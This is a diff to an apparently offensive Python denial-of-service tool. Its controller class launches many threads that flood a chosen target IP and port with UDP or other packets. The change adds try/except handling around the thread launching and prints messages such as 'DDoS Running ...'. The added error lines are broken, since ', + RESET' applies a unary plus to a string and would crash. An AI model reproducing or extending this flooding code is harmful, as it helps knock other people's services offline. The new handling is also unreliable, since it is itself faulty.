@@ -126,10 +126,19 @@ class Controller(Dos):
         elif dos_mode == 'udp':
             self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
         for nr in range(int(amount)):
-            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
-            print(GREEN + "Starting Thread nr [{}] to target [{}]".format(thread, target_ip) + RESET)
-            thread.start()
-            print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]".format(dos_mode, thread, buffer_size, target_ip) + RESET)
+            try:
+                thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
+                print(GREEN + "Starting Thread nr [{}] to target [{}]".format(thread, target_ip) + RESET)
+                thread.start()
+                print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]".format(dos_mode, thread, buffer_size, target_ip) + RESET)
+            except Exception as ex:
+                print(RED + "Error in Threading [{}] :", ex, + RESET)
+                sys.exit(0)
+            except KeyboardInterrupt as ex:
+                print(RED + "Exit - you pressed ctrl + c :", ex, + RESET)
+                sys.exit(0)
+            else:
+                print(GREEN + "DDoS Running ..." + RESET)
 
     def run(self):
         """ Run function to start everything """
